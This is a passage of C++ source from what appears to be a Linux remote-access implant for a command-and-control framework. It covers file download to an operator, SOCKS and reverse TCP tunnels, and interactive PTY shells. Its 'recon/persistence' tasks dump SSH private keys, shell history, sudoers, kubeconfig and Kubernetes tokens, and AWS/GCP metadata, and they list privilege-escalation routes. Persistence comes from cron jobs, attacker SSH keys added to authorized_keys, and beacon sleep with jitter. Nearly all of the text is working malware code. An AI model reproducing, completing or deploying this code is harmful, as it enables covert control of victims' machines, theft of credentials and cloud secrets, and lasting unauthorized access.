        total+=(size_t)rr;
    }
    if(total==0 && st.st_size>0){ close(fd); return err_answer(errstr(errno)); }
    buf.resize(total);
    if((int64_t)total>=st.st_size){
        close(fd);
        return mp_map({{"id",mp_i64(task_id)},{"path",mp_str(path)},{"size",mp_i64(st.st_size)},{"content",mp_bin(buf)},{"start",mp_bool(true)},{"finish",mp_bool(true)}});
    }
    {
        std::lock_guard<std::mutex> lk(dl_mu);
        auto old=downloads.find(path);
        if(old!=downloads.end() && old->second.fd>=0) close(old->second.fd);
        downloads[path]={task_id,path,fd,(int64_t)total,st.st_size};
    }
    return mp_map({{"id",mp_i64(task_id)},{"path",mp_str(path)},{"size",mp_i64(st.st_size)},{"content",mp_bin(buf)},{"start",mp_bool(true)},{"finish",mp_bool(false)}});
}

std::vector<bytes> collect_download_chunks(){
    struct Work { std::string key; DownloadState st; };
    std::vector<Work> works;
    {
        std::lock_guard<std::mutex> lk(dl_mu);
        for(auto& kv : downloads) works.push_back({kv.first, kv.second});
    }
    std::vector<bytes> out;
    for(auto& w : works){
        const size_t CH=0x100000; bytes buf(CH);
        size_t total=0; bool read_error=false;
        while(total<CH){
            ssize_t r=read(w.st.fd,buf.data()+total,CH-total);
            if(r<0 && errno==EINTR) continue;
            if(r<0){ read_error=true; break; }
            if(r==0) break;
            total+=(size_t)r;
        }
        if(read_error){
            close(w.st.fd);
            std::lock_guard<std::mutex> lk(dl_mu); downloads.erase(w.key);
            bytes ans=mp_map({{"id",mp_i64(w.st.task_id)},{"path",mp_str(w.st.path)},{"size",mp_i64(w.st.size)},{"content",mp_bin(bytes{})},{"start",mp_bool(false)},{"finish",mp_bool(true)},{"canceled",mp_bool(true)}});
            bytes cmd=mp_map({{"code",mp_u64(CMD_DOWNLOAD)},{"id",mp_u64(w.st.task_id)},{"data",mp_bin(ans)}});
            out.push_back(cmd);
            continue;
        }
        ssize_t n=(ssize_t)total;
        buf.resize(n);
        bool finish=false;
        if(n==0 || w.st.offset+(int64_t)n>=w.st.size) finish=true;
        int64_t new_off = w.st.offset + n;
        bytes ans=mp_map({{"id",mp_i64(w.st.task_id)},{"path",mp_str(w.st.path)},{"size",mp_i64(w.st.size)},{"content",mp_bin(buf)},{"start",mp_bool(false)},{"finish",mp_bool(finish)}});
        bytes cmd=mp_map({{"code",mp_u64(CMD_DOWNLOAD)},{"id",mp_u64(w.st.task_id)},{"data",mp_bin(ans)}});
        out.push_back(cmd);
        if(finish){
            close(w.st.fd);
            std::lock_guard<std::mutex> lk(dl_mu); downloads.erase(w.key);
        } else {
            std::lock_guard<std::mutex> lk(dl_mu);
            auto it=downloads.find(w.key);
            if(it!=downloads.end()) it->second.offset = new_off;
        }
    }
    return out;
}

// ---------------------------------------------------------------------
// Tunnel / SOCKS TCP
// ---------------------------------------------------------------------
struct TunnelState { int fd=-1; bool paused=false; bool udp=false; bytes outbuf; };
static std::mutex tun_mu;
static std::map<int,TunnelState> tunnels;
static std::mutex rev_mu;
static std::map<int,int> reverse_fds;
static int next_channel=0x10000000;

static void tune_tunnel_socket(int fd, bool udp){
    int one=1;
    if(!udp) setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
    setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &one, sizeof(one));
}

static bytes task_tunnel_start(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string proto,address; int ch=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="proto") proto=r.read_str(); else if(k=="address") address=r.read_str(); else if(k=="channel_id") ch=(int)r.read_i64(); else r.skip_value(); }
    bool udp=(proto=="udp");
    int type=udp?SOCK_DGRAM:SOCK_STREAM;
    std::string host,port;
    if(!split_host_port(address,host,port,"80")) return mp_map({{"result",mp_i64(2)}});
    struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_UNSPEC; hints.ai_socktype=type;
    if(getaddrinfo(host.c_str(),port.c_str(),&hints,&res)!=0) return mp_map({{"result",mp_i64(2)}});
    int fd=-1;
    for(auto ai=res; ai; ai=ai->ai_next){
        int s=socket(ai->ai_family,ai->ai_socktype,ai->ai_protocol);
        if(s<0) continue;
        int flags=fcntl(s,F_GETFL,0); fcntl(s,F_SETFL,flags|O_NONBLOCK);
        int rc=connect(s,ai->ai_addr,ai->ai_addrlen);
        if(rc!=0 && errno==EINPROGRESS){
            struct pollfd pfd{s,POLLOUT,0};
            int pr;
            do { pr=poll(&pfd,1,10000); } while(pr<0 && errno==EINTR);
            if(pr<=0){ close(s); continue; }
            int soerr=0; socklen_t slen=sizeof(soerr); getsockopt(s,SOL_SOCKET,SO_ERROR,&soerr,&slen);
            if(soerr!=0){ close(s); continue; }
        } else if(rc!=0){ close(s); continue; }
        fcntl(s,F_SETFL,flags|O_NONBLOCK);
        fd=s;
        break;
    }
    freeaddrinfo(res);
    if(fd<0) return mp_map({{"result",mp_i64(2)}});
    tune_tunnel_socket(fd, udp);
    {
        std::lock_guard<std::mutex> lk(tun_mu);
        auto it=tunnels.find(ch);
        if(it!=tunnels.end()){ if(it->second.fd>=0) close(it->second.fd); }
        else if(tunnels.size() >= MAX_TUNNELS){ close(fd); return mp_map({{"result",mp_i64(2)}}); }
        tunnels[ch]=TunnelState{fd,false,udp,{}};
    }
    return mp_map({{"result",mp_i64(0)}});
}

static bytes task_tunnel_write(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int ch=0; bytes b;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="channel_id") ch=(int)r.read_i64(); else if(k=="data") b=r.read_bin(); else r.skip_value(); }
    std::lock_guard<std::mutex> lk(tun_mu); auto it=tunnels.find(ch);
    if(it!=tunnels.end() && it->second.fd>=0){
        if(it->second.udp){
            if(b.size()<=65507){
                ssize_t w;
                do { w = send(it->second.fd, b.data(), b.size(), MSG_NOSIGNAL); }
                while(w < 0 && errno == EINTR);
                if(w < 0 && errno != EAGAIN && errno != EWOULDBLOCK){
                    close(it->second.fd);
                    it->second.fd = -1;
                }
            }
        } else {
            if(it->second.outbuf.empty()){
                size_t sent=0;
                if(send_nonblock_partial(it->second.fd,b.data(),b.size(),sent)){
                    // fully written
                } else if(errno==EAGAIN || errno==EWOULDBLOCK){
                    size_t left = b.size()-sent;
                    if(left > MAX_TUNNEL_QUEUE){
                        close(it->second.fd); it->second.fd=-1; it->second.outbuf.clear();
                    } else if(sent<b.size()) {
                        it->second.outbuf.assign(b.begin()+sent,b.end());
                    }
                } else {
                    close(it->second.fd); it->second.fd=-1;
                }
            } else {
                if(it->second.outbuf.size() + b.size() > MAX_TUNNEL_QUEUE){
                    close(it->second.fd); it->second.fd=-1; it->second.outbuf.clear();
                } else {
                    it->second.outbuf.insert(it->second.outbuf.end(), b.begin(), b.end());
                }
            }
        }
    }
    return bytes{};
}

static bytes task_tunnel_stop(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int ch=0, tunnel_id=0;
    for(uint32_t i=0;i<n;i++){
        std::string k=r.read_str();
        if(k=="channel_id") ch=(int)r.read_i64();
        else if(k=="tunnel_id") tunnel_id=(int)r.read_i64();
        else r.skip_value();
    }
    {
        std::lock_guard<std::mutex> lk(tun_mu); auto it=tunnels.find(ch); if(it!=tunnels.end()){ close(it->second.fd); tunnels.erase(it); }
    }
    {
        int reverse_key = tunnel_id ? tunnel_id : ch;
        std::lock_guard<std::mutex> lk(rev_mu); auto it=reverse_fds.find(reverse_key); if(it!=reverse_fds.end()){ close(it->second); reverse_fds.erase(it); }
    }
    return mp_map({{"channel_id",mp_i64(ch)}});
}

static bytes task_tunnel_pause(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int ch=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="channel_id") ch=(int)r.read_i64(); else r.skip_value(); }
    std::lock_guard<std::mutex> lk(tun_mu); if(tunnels.count(ch)) tunnels[ch].paused=true; return mp_map({{"channel_id",mp_i64(ch)}});
}
static bytes task_tunnel_resume(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int ch=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="channel_id") ch=(int)r.read_i64(); else r.skip_value(); }
    std::lock_guard<std::mutex> lk(tun_mu); if(tunnels.count(ch)) tunnels[ch].paused=false; return mp_map({{"channel_id",mp_i64(ch)}});
}

std::vector<bytes> collect_tunnel_output(){
    std::vector<bytes> out;
    std::lock_guard<std::mutex> lk(tun_mu);
    for(auto it=tunnels.begin();it!=tunnels.end();){
        int ch=it->first; auto& st=it->second;
        if(st.fd<0){
            bytes ans=mp_map({{"channel_id",mp_i64(ch)}});
            bytes cmd=mp_map({{"code",mp_u64(CMD_TUNNEL_STOP)},{"id",mp_u64((uint32_t)ch)},{"data",mp_bin(ans)}});
            out.push_back(cmd); it=tunnels.erase(it); continue;
        }
        if(st.paused){++it;continue;}
        if(!st.outbuf.empty()){
            struct pollfd pw{st.fd,POLLOUT,0};
            int pr=poll(&pw,1,0);
            if(pr>0){
                size_t sent=0;
                bool all=send_nonblock_partial(st.fd,st.outbuf.data(),st.outbuf.size(),sent);
                if(sent>0) st.outbuf.erase(st.outbuf.begin(), st.outbuf.begin()+sent);
                if(all){
                    st.outbuf.clear();
                } else if(errno!=EAGAIN && errno!=EWOULDBLOCK){
                    close(st.fd); bytes ans=mp_map({{"channel_id",mp_i64(ch)}}); bytes cmd=mp_map({{"code",mp_u64(CMD_TUNNEL_STOP)},{"id",mp_u64((uint32_t)ch)},{"data",mp_bin(ans)}}); out.push_back(cmd); it=tunnels.erase(it); continue;
                }
            }
            if(!st.outbuf.empty()){ ++it; continue; }
        }
        uint8_t buf[0x8000]; ssize_t n=recv(st.fd,buf,sizeof(buf),0);
        if(n>0){
            bytes b(buf,buf+n);
            bytes ans=mp_map({{"channel_id",mp_i64(ch)},{"data",mp_bin(b)}});
            bytes cmd=mp_map({{"code",mp_u64(CMD_TUNNEL_WRITE)},{"id",mp_u64((uint32_t)ch)},{"data",mp_bin(ans)}});
            out.push_back(cmd); ++it;
        } else if(n==0 && st.udp){
            ++it; continue;
        } else if(n<0 && errno==EINTR){
            ++it; continue;
        } else if(n==0 || (errno!=EAGAIN && errno!=EWOULDBLOCK)){
            close(st.fd); bytes ans=mp_map({{"channel_id",mp_i64(ch)}}); bytes cmd=mp_map({{"code",mp_u64(CMD_TUNNEL_STOP)},{"id",mp_u64((uint32_t)ch)},{"data",mp_bin(ans)}}); out.push_back(cmd); it=tunnels.erase(it);
        } else ++it;
    }
    return out;
}

// Reverse TCP listener: accepted connections are handed back through CMD_TUNNEL_ACCEPT.

static bytes task_tunnel_reverse(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int tid=0,port=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="tunnel_id") tid=(int)r.read_i64(); else if(k=="port") port=(int)r.read_i64(); else r.skip_value(); }
    if(port<1 || port>65535) return mp_map({{"result",mp_i64(2)}});
    int fd=-1; int one=1;
    fd=socket(AF_INET6,SOCK_STREAM,0);
    if(fd>=0){
        int no=0; setsockopt(fd,IPPROTO_IPV6,IPV6_V6ONLY,&no,sizeof(no));
        setsockopt(fd,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
        struct sockaddr_in6 sa6{}; sa6.sin6_family=AF_INET6; sa6.sin6_addr=in6addr_any; sa6.sin6_port=htons((uint16_t)port);
        if(bind(fd,(sockaddr*)&sa6,sizeof(sa6))!=0||listen(fd,16)!=0){ close(fd); fd=-1; }
    }
    if(fd<0){
        fd=socket(AF_INET,SOCK_STREAM,0); if(fd<0) return mp_map({{"result",mp_i64(2)}});
        setsockopt(fd,SOL_SOCKET,SO_REUSEADDR,&one,sizeof(one));
        struct sockaddr_in sa{}; sa.sin_family=AF_INET; sa.sin_addr.s_addr=INADDR_ANY; sa.sin_port=htons((uint16_t)port);
        if(bind(fd,(sockaddr*)&sa,sizeof(sa))!=0||listen(fd,16)!=0){ close(fd); return mp_map({{"result",mp_i64(2)}}); }
    }
    set_nonblock(fd);
    {
        std::lock_guard<std::mutex> lk(rev_mu);
        auto it=reverse_fds.find(tid);
        if(it!=reverse_fds.end() && it->second>=0) close(it->second);
        reverse_fds[tid]=fd;
    }
    return mp_map({{"result",mp_i64(0)}});
}

std::vector<bytes> collect_tunnel_accepts(){
    struct Accepted { int tid; int ch; int fd; };
    std::vector<Accepted> accepted;
    const int MAX_ACCEPTS = 32;
    {
        std::lock_guard<std::mutex> lk(rev_mu);
        for(auto& kv:reverse_fds){
            int fd=kv.second; if(fd<0) continue;
            for(int i=0;i<MAX_ACCEPTS;i++){
                int c=accept(fd,nullptr,nullptr);
                if(c<0){ if(errno==EINTR) continue; break; }
                if(c<3){
                    int nc=move_fd_above(c);
                    if(nc<0){ close(c); continue; }
                    c=nc;
                }
                int ch=next_channel++;
                set_nonblock(c);
                tune_tunnel_socket(c, false);
                accepted.push_back({kv.first, ch, c});
            }
        }
    }
    std::vector<bytes> out;
    if(!accepted.empty()){
        std::lock_guard<std::mutex> lk(tun_mu);
        for(auto& a:accepted) tunnels[a.ch]=TunnelState{a.fd,false,false,{}};
    }
    for(auto& a:accepted){
        bytes ans=mp_map({{"tunnel_id",mp_i64(a.tid)},{"channel_id",mp_i64(a.ch)}});
        bytes cmd=mp_map({{"code",mp_u64(CMD_TUNNEL_ACCEPT)},{"id",mp_u64((uint32_t)a.ch)},{"data",mp_bin(ans)}});
        out.push_back(cmd);
    }
    return out;
}

// ---------------------------------------------------------------------
// PTY terminal
// ---------------------------------------------------------------------
struct TermState { int master=-1; pid_t pid=-1; bytes outbuf; };
static std::mutex term_mu;
static std::map<int,TermState> terms;

static void close_terminal_locked(int tid){
    auto it=terms.find(tid);
    if(it==terms.end()) return;
    if(it->second.master>=0) close(it->second.master);
    if(it->second.pid>0){ kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); }
    terms.erase(it);
}

static int open_pty_pair(int* master, int* slave, const struct winsize& ws){
    int m=posix_openpt(O_RDWR | O_NOCTTY);
    if(m<0) return -1;
    if(grantpt(m)!=0 || unlockpt(m)!=0){ close(m); return -1; }
    char name[128];
    if(ptsname_r(m,name,sizeof(name))!=0){ close(m); return -1; }
    int s=open(name,O_RDWR | O_NOCTTY);
    if(s<0){ close(m); return -1; }
    ioctl(m,TIOCSWINSZ,&ws);
    *master=m; *slave=s;
    return 0;
}

static bytes task_terminal_start(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int tid=0; std::string program="/bin/sh"; int rows=24,cols=80;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="term_id") tid=(int)r.read_i64(); else if(k=="program") program=r.read_str(); else if(k=="height") rows=(int)r.read_i64(); else if(k=="width") cols=(int)r.read_i64(); else r.skip_value(); }
    {
        std::lock_guard<std::mutex> lk(term_mu);
        if(!terms.count(tid) && terms.size() >= MAX_TERMINALS) return err_answer("too many terminals");
        close_terminal_locked(tid);
    }
    int master=-1, slave=-1; struct winsize ws{ (unsigned short)rows,(unsigned short)cols,0,0 };
    if(open_pty_pair(&master,&slave,ws)!=0) return err_answer(errstr(errno));
    pid_t pid=fork();
    if(pid<0){ close(master); close(slave); return err_answer(errstr(errno)); }
    if(pid==0){
        setsid();
        slave=move_fd_above(slave);
        if(slave<3) _exit(127);
        ioctl(slave,TIOCSCTTY,0);
        dup2(slave,STDIN_FILENO); dup2(slave,STDOUT_FILENO); dup2(slave,STDERR_FILENO);
        if(slave>2) close(slave);
        if(master>=0) close(master);
        close_extra_fds();
        execl(program.c_str(), program.c_str(), (char*)nullptr);
        _exit(127);
    }
    close(slave);
    set_nonblock(master);
    std::lock_guard<std::mutex> lk(term_mu); terms[tid]=TermState{master,pid,{}};
    return bytes{};
}
static bytes task_terminal_write(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int tid=0; bytes b;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="term_id") tid=(int)r.read_i64(); else if(k=="data") b=r.read_bin(); else r.skip_value(); }
    std::lock_guard<std::mutex> lk(term_mu); auto it=terms.find(tid);
    if(it!=terms.end()&&it->second.master>=0){
        if(it->second.outbuf.empty()){
            size_t sent=0;
            if(write_nonblock_partial(it->second.master,b.data(),b.size(),sent)){
                // fully written
            } else if(errno==EAGAIN || errno==EWOULDBLOCK){
                size_t left = b.size()-sent;
                if(left > MAX_TERMINAL_QUEUE){
                    close(it->second.master); kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); terms.erase(it);
                    return bytes{};
                } else if(sent<b.size()) {
                    it->second.outbuf.assign(b.begin()+sent,b.end());
                }
            } else {
                close(it->second.master); kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); terms.erase(it);
            }
        } else {
            if(it->second.outbuf.size() + b.size() > MAX_TERMINAL_QUEUE){
                close(it->second.master); kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); terms.erase(it);
            } else {
                it->second.outbuf.insert(it->second.outbuf.end(), b.begin(), b.end());
            }
        }
    }
    return bytes{};
}
static bytes task_terminal_stop(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int tid=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="term_id") tid=(int)r.read_i64(); else r.skip_value(); }
    std::lock_guard<std::mutex> lk(term_mu); auto it=terms.find(tid); if(it!=terms.end()){ close(it->second.master); if(it->second.pid>0){ kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); } terms.erase(it);} return bytes{};
}
std::vector<bytes> collect_terminal_output(){
    std::vector<bytes> out;
    std::lock_guard<std::mutex> lk(term_mu);
    for(auto it=terms.begin();it!=terms.end();){
        int tid=it->first; int master=it->second.master;
        if(!it->second.outbuf.empty()){
            struct pollfd pw{master,POLLOUT,0};
            int pr=poll(&pw,1,0);
            if(pr>0){
                size_t sent=0;
                bool all=write_nonblock_partial(master,it->second.outbuf.data(),it->second.outbuf.size(),sent);
                if(sent>0) it->second.outbuf.erase(it->second.outbuf.begin(), it->second.outbuf.begin()+sent);
                if(all){
                    it->second.outbuf.clear();
                } else if(errno!=EAGAIN && errno!=EWOULDBLOCK){
                    close(master); kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); bytes ans=mp_map({{"term_id",mp_i64(tid)}}); bytes cmd=mp_map({{"code",mp_u64(CMD_TERMINAL_STOP)},{"id",mp_u64((uint32_t)tid)},{"data",mp_bin(ans)}}); out.push_back(cmd); it=terms.erase(it); continue;
                }
            }
            if(!it->second.outbuf.empty()){ ++it; continue; }
        }
        uint8_t buf[0x8000]; ssize_t n=read(master,buf,sizeof(buf));
        if(n>0){ bytes b(buf,buf+n); bytes ans=mp_map({{"term_id",mp_i64(tid)},{"data",mp_bin(b)}}); bytes cmd=mp_map({{"code",mp_u64(CMD_TERMINAL_WRITE)},{"id",mp_u64((uint32_t)tid)},{"data",mp_bin(ans)}}); out.push_back(cmd); ++it; }
        else if(n<0 && errno==EINTR){
            ++it; continue;
        } else if(n==0 || (errno!=EAGAIN&&errno!=EWOULDBLOCK)){ close(master); if(it->second.pid>0){ kill(it->second.pid,SIGKILL); waitpid(it->second.pid,nullptr,0); } bytes ans=mp_map({{"term_id",mp_i64(tid)}}); bytes cmd=mp_map({{"code",mp_u64(CMD_TERMINAL_STOP)},{"id",mp_u64((uint32_t)tid)},{"data",mp_bin(ans)}}); out.push_back(cmd); it=terms.erase(it); }
        else ++it;
    }
    return out;
}

// ---------------------------------------------------------------------
// Linux-specific recon/persistence commands (generic output)
// ---------------------------------------------------------------------
static bytes task_sysinfo(){ return generic_answer(run_shell("uname -a; echo; cat /etc/os-release 2>/dev/null; echo; uptime 2>/dev/null; echo; cat /proc/version 2>/dev/null")); }
static bytes task_env(){ return generic_answer(run_shell("env")); }
static bytes task_network(){ return generic_answer(run_shell("ip addr 2>/dev/null; echo '--- ROUTES ---'; ip route 2>/dev/null; echo '--- DNS ---'; cat /etc/resolv.conf 2>/dev/null; echo '--- ARP ---'; ip neigh 2>/dev/null || arp -a 2>/dev/null; echo '--- LISTEN ---'; ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null")); }
static bytes task_users(){ return generic_answer(run_shell("cat /etc/passwd 2>/dev/null; echo '--- GROUPS ---'; cat /etc/group 2>/dev/null; echo '--- LOGGED ---'; who 2>/dev/null; w 2>/dev/null; echo '--- SUDOERS ---'; cat /etc/sudoers 2>/dev/null | grep -v '^#' | grep -v '^$'; ls -la /etc/sudoers.d 2>/dev/null")); }
static bytes task_cron(){ return generic_answer(run_shell("cat /etc/crontab 2>/dev/null; echo '--- CRON.D ---'; for f in /etc/cron.d/* /etc/cron.daily/* /etc/cron.hourly/* /etc/cron.weekly/* /etc/cron.monthly/*; do echo \"== $f\"; cat \"$f\" 2>/dev/null; done; echo '--- USER CRON ---'; crontab -l 2>/dev/null; echo '--- ANACRON ---'; cat /etc/anacrontab 2>/dev/null")); }
static bytes task_sshkeys(){ return generic_answer(run_shell("ls -la ~/.ssh 2>/dev/null; echo '--- id_rsa ---'; cat ~/.ssh/id_rsa 2>/dev/null; echo '--- id_ed25519 ---'; cat ~/.ssh/id_ed25519 2>/dev/null; echo '--- authorized_keys ---'; cat ~/.ssh/authorized_keys 2>/dev/null; echo '--- known_hosts ---'; cat ~/.ssh/known_hosts 2>/dev/null; echo '--- ROOT ---'; ls -la /root/.ssh 2>/dev/null; cat /root/.ssh/id_rsa 2>/dev/null; cat /root/.ssh/authorized_keys 2>/dev/null")); }
static bytes task_history(){ return generic_answer(run_shell("cat ~/.bash_history 2>/dev/null; echo '--- ROOT ---'; cat /root/.bash_history 2>/dev/null; echo '--- ZSH ---'; cat ~/.zsh_history 2>/dev/null; cat /root/.zsh_history 2>/dev/null")); }
static bytes task_docker(){ return generic_answer(run_shell("docker ps -a 2>/dev/null; echo '--- IMAGES ---'; docker images 2>/dev/null; echo '--- SOCKET ---'; ls -la /var/run/docker.sock 2>/dev/null; id 2>/dev/null | grep -o 'docker'")); }
static bytes task_services(){ return generic_answer(run_shell("systemctl list-units --type=service --state=running --no-pager --no-legend 2>/dev/null | head -200")); }
static bytes task_privesc(){ return generic_answer(run_shell("echo '=== SUDO ==='; sudo -n -l 2>/dev/null; echo '=== SUID ==='; find / -perm -4000 -type f 2>/dev/null; echo '=== SGID ==='; find / -perm -2000 -type f 2>/dev/null; echo '=== CAPABILITIES ==='; getcap -r / 2>/dev/null; echo '=== WRITABLE /etc/passwd ==='; ls -la /etc/passwd /etc/shadow /etc/sudoers 2>/dev/null; echo '=== KERNEL ==='; uname -r; echo '=== DOCKER GROUP ==='; id", 300)); }
static bytes task_mounts(){ return generic_answer(run_shell("cat /proc/mounts 2>/dev/null; echo '--- DF ---'; df -h 2>/dev/null; echo '--- BLOCK ---'; lsblk 2>/dev/null")); }
static bytes task_persist_cron(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string program;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="program") program=r.read_str(); else r.skip_value(); }
    if(program.empty()) return err_answer("empty command");
    std::string line="*/5 * * * * "+sh_q(program);
    return generic_answer(run_shell("(crontab -l 2>/dev/null; echo "+sh_q(line)+") | crontab - 2>/dev/null && echo 'cron installed' || echo 'cron install failed'"));
}
static bytes task_persist_ssh(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string pubkey;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="program") pubkey=r.read_str(); else r.skip_value(); }
    if(pubkey.empty()) return err_answer("empty public key");
    std::string cmd="mkdir -p ~/.ssh && echo "+sh_q(pubkey)+" >> ~/.ssh/authorized_keys && echo 'ssh key added'";
    return generic_answer(run_shell(cmd));
}
static bytes task_getuid(){ return generic_answer(run_shell("id; echo '--- WHOAMI ---'; whoami; echo '--- GROUPS ---'; groups")); }
static bytes task_filesearch(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); std::string pattern="*.conf";
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="program") pattern=r.read_str(); else r.skip_value(); }
    return generic_answer(run_shell("find / -type f -iname "+sh_q(pattern)+" 2>/dev/null | head -200", 300));
}
static bytes task_sshagent(){ return generic_answer(run_shell("env | grep -i ssh; echo '--- SOCKET ---'; ls -la $SSH_AUTH_SOCK 2>/dev/null; echo '--- AGENT KEYS ---'; ssh-add -l 2>/dev/null; echo '--- PRIVATE KEYS ---'; find / -maxdepth 4 -type f \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_dsa' \\) 2>/dev/null | head -100")); }
static bytes task_kubeconfig(){ return generic_answer(run_shell("cat ~/.kube/config 2>/dev/null; echo '--- SERVICE ACCOUNT ---'; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null; echo; cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | head -c 500; echo '--- ENV ---'; env | grep -i kube")); }
static std::string http_meta_req(const std::string& host, int port, const std::string& path, const std::string& method="GET", const std::string& extra_header=""){
    const size_t MAX_META_RESPONSE = 4ULL * 1024ULL * 1024ULL;
    struct addrinfo hints{},*res=nullptr; hints.ai_family=AF_UNSPEC; hints.ai_socktype=SOCK_STREAM;
    std::string portstr=std::to_string(port);
    if(getaddrinfo(host.c_str(),portstr.c_str(),&hints,&res)!=0) return "";
    int fd=socket(res->ai_family,res->ai_socktype,res->ai_protocol);
    if(fd<0){ freeaddrinfo(res); return ""; }
    struct timeval tv{3,0}; setsockopt(fd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv)); setsockopt(fd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv));
    int fl=fcntl(fd,F_GETFL,0); if(fl<0){ close(fd); freeaddrinfo(res); return ""; }
    if(fcntl(fd,F_SETFL,fl|O_NONBLOCK)<0){ close(fd); freeaddrinfo(res); return ""; }
    int cr=connect(fd,res->ai_addr,res->ai_addrlen);
    if(cr!=0 && errno==EINPROGRESS){
        struct pollfd pfd{fd,POLLOUT,0}; int pr;
        do { pr=poll(&pfd,1,3000); } while(pr<0 && errno==EINTR);
        if(pr<=0){ close(fd); freeaddrinfo(res); return ""; }
        int soerr=0; socklen_t slen=sizeof(soerr); getsockopt(fd,SOL_SOCKET,SO_ERROR,&soerr,&slen);
        if(soerr!=0){ close(fd); freeaddrinfo(res); return ""; }
    } else if(cr!=0){ close(fd); freeaddrinfo(res); return ""; }
    fcntl(fd,F_SETFL,fl);
    freeaddrinfo(res);
    std::string req=method+" "+path+" HTTP/1.0\r\nHost: "+host+"\r\nConnection: close\r\n"+extra_header+"\r\n";
    if(!fd_send_all(fd,(const uint8_t*)req.data(),req.size())){ close(fd); return ""; }
    std::string out; char buf[4096];
    while(true){
        ssize_t n=recv(fd,buf,sizeof(buf),0);
        if(n>0){
            if(out.size()+(size_t)n>MAX_META_RESPONSE) break;
            out.append(buf,n); continue;
        }
        if(n==0) break;
        if(errno==EINTR) continue;
        break;
    }
    close(fd);
    auto pos=out.find("\r\n\r\n");
    if(pos==std::string::npos) return "";
    std::string headers=out.substr(0,pos);
    size_t sp1=headers.find(' '); if(sp1==std::string::npos) return "";
    size_t sp2=headers.find(' ',sp1+1); if(sp2==std::string::npos) sp2=headers.find("\r\n",sp1);
    if(sp2==std::string::npos) return "";
    std::string status_str=headers.substr(sp1+1,sp2-sp1-1);
    char* end=nullptr; errno=0;
    long status_long=strtol(status_str.c_str(),&end,10);
    if(errno!=0 || end==status_str.c_str() || *end!='\0') return "";
    int status=(int)status_long;
    if(status<200 || status>=300) return "";
    return out.substr(pos+4);
}

static bytes task_cloudmeta(){
    std::string out;
    std::string aws_token = http_meta_req("169.254.169.254", 80, "/latest/api/token", "PUT", "X-aws-ec2-metadata-token-ttl-seconds: 21600\r\n");
    if(!aws_token.empty()){
        while(!aws_token.empty() && (aws_token.back()=='\n'||aws_token.back()=='\r')) aws_token.pop_back();
        out += "=== AWS ===\n";
        out += http_meta_req("169.254.169.254", 80, "/latest/meta-data/", "GET", "X-aws-ec2-metadata-token: "+aws_token+"\r\n");
        out += "\n";
    }
    std::string gcp = http_meta_req("metadata.google.internal", 80, "/computeMetadata/v1/instance/?recursive=true", "GET", "Metadata-Flavor: Google\r\n");
    if(!gcp.empty()){
        out += "=== GCP ===\n" + gcp + "\n";
    }
    if(out.empty()) out="no cloud metadata found (not an AWS/GCP instance)\n";
    return generic_answer(out);
}
static bytes task_sleep(const bytes& data){
    MpReader r{data}; uint32_t n=r.read_map(); int64_t sec=10,jit=0;
    for(uint32_t i=0;i<n;i++){ std::string k=r.read_str(); if(k=="sleep_seconds") sec=r.read_i64(); else if(k=="jitter") jit=r.read_i64(); else r.skip_value(); }
    if(sec<0 || sec>604800) return err_answer("sleep must be between 0 and 604800 seconds");
    if(jit<0) jit=0;
    if(jit>100) jit=100;
    sleep_sec=(int)sec; sleep_jit=(int)jit; set_payload_sleep((int)sec,(int)jit);
    return generic_answer("sleep set to "+std::to_string(sec)+"s (jitter "+std::to_string(jit)+"%)");
}
static bytes task_whoami(){ return generic_answer(run_shell("whoami; id -un 2>/dev/null")); }
static bytes task_hostname(){ return generic_answer(run_shell("hostname; hostname -f 2>/dev/null; echo '--- /etc/hostname ---'; cat /etc/hostname 2>/dev/null")); }
static bytes task_lsof(){ return generic_answer(run_shell("lsof -nP 2>/dev/null | head -200; if ! command -v lsof >/dev/null 2>&1; then ss -tulpn 2>/dev/null; fi")); }
